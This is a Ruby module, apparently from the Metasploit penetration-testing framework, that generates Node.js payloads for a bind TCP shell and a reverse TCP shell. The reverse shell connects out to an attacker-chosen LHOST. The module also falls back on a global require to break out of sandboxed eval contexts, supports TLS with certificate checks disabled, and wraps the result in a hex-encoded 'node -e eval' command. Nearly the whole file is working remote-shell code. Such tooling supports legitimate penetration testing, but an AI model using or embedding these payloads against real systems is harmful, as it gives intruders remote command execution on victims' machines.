# -*- coding: binary -*-
require 'msf/core'

module Msf::Payload::NodeJS
  # Outputs a javascript snippet that spawns a bind TCP shell
  # @return [String] javascript code that executes bind TCP payload
  def nodejs_bind_tcp
    cmd = <<-EOS
      (function(){
        var require = global.require || global.process.mainModule.constructor._load;
        if (!require) return;

        var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
        var net = require("net"),
            cp = require("child_process"),
            util = require("util");

        var server = net.createServer(function(socket) {  
          var sh = cp.spawn(cmd, []);
          socket.pipe(sh.stdin);
          util.pump(sh.stdout, socket);
          util.pump(sh.stderr, socket);
        });
        server.listen(#{datastore['LPORT']});
      })();
    EOS
    cmd.gsub("\n",'').gsub(/\s+/,' ').gsub(/[']/, '\\\\\'')
  end

  # Outputs a javascript snippet that spawns a reverse TCP shell
  # @param [Hash] opts the options to create the reverse TCP payload with
  # @option opts [Boolean] :use_ssl use SSL when communicating with the shell. defaults to false.
  # @return [String] javascript code that executes reverse TCP payload
  def nodejs_reverse_tcp(opts={})
    use_ssl = opts.fetch(:use_ssl, false)
    tls_hash = if use_ssl then '{rejectUnauthorized:false}, ' else '' end
    net_lib = if use_ssl then 'tls' else 'net' end
    lhost = Rex::Socket.is_ipv6?(lhost) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
    # the global.process.mainModule.constructor._load fallback for require() is
    # handy when the payload is eval()'d into a sandboxed context: the reference
    # to 'require' is missing, but can be looked up from the 'global' object.
    #
    # however, this fallback might break in later versions of nodejs.
    cmd = <<-EOS
      (function(){
        var require = global.require || global.process.mainModule.constructor._load;
        if (!require) return;
        var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
        var net = require("#{net_lib}"),
            cp = require("child_process"),
            util = require("util"),
            sh = cp.spawn(cmd, []);
        var client = this;
        client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", #{tls_hash} function() {
          client.socket.pipe(sh.stdin);
          util.pump(sh.stdout, client.socket);
          util.pump(sh.stderr, client.socket);
        });
      })();
    EOS
    cmd.gsub("\n",'').gsub(/\s+/,' ').gsub(/[']/, '\\\\\'')
  end

  # Wraps the javascript code param in a "node" command invocation
  # @param [String] code the javascript code to run
  # @return [String] a command that invokes "node" and passes the code
  def nodejs_cmd(code)
    "node -e 'eval(\"#{Rex::Text.to_hex(code, "\\x")}\");'"
  end
end
